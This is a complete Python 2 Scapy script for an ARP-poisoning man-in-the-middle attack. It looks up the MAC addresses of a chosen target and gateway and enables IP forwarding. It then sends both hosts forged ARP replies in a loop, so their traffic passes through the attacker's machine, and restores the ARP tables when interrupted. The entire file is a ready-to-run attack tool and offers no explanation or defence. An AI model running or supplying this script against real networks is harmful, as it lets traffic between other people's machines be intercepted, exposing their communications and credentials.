import argparse
import time
import sys
from scapy.all import *

conf.verb = 0

def poison(target, target_mac, gateway, gateway_mac):
	target_poison_pkt = ARP(op=2, psrc=gateway, hwdst=target_mac, pdst=target)
	gateway_poison_pkt = ARP(op=2, psrc=target, hwdst=gateway_mac, pdst=gateway)

	print "[*] Attack started *-* --> pew --> pew"

	while True:
		send(target_poison_pkt)
		send(gateway_poison_pkt)
		time.sleep(2)

def restore(target, target_mac, gateway, gateway_mac):
	send(ARP(op=2, psrc=target, hwsrc=target_mac, hwdst=gateway_mac, pdst=gateway), count=5)
	send(ARP(op=2, psrc=gateway, hwsrc=gateway_mac, hwdst=target_mac, pdst=target), count=5)

	with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
			f.write('0\n')

	sys.exit(0)

def getmac(ip):
	ans, uans = arping(ip)
	for s, r in ans:
		return r[Ether].src

def main():
	parser = argparse.ArgumentParser(description="ARP poison MITM script")
	parser.add_argument("-g", "--gateway", help="Specify gateway IP", required=True)
	parser.add_argument("-t", "--target", help="Specify target IP", required=True)
	parser.add_argument("-i", "--iface", help="Specify interface to use")
	args = parser.parse_args()

	gateway_mac = getmac(args.gateway)
	target_mac = getmac(args.target)

	if args.iface:
		conf.iface = args.iface

	if gateway_mac == None or target_mac == None:
		print "[-] Target or gateway mac not found"
		sys.exit(0)

	print "[*] Using %s as interface" % conf.iface
	print "[*] Gateway at %s | %s" % (args.gateway, gateway_mac)
	print "[*] Target at %s | %s" % (args.target, target_mac)

	try:
		with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
			f.write('1\n')
	except Exception, e:
		print "[-] Could not enable IP forwarding, check permissions"
		sys.exit(0)

	try:
		poison(args.target, target_mac, args.gateway, gateway_mac)
	except KeyboardInterrupt:
		restore(args.target, target_mac, args.gateway, gateway_mac)

if __name__ == '__main__':
	main()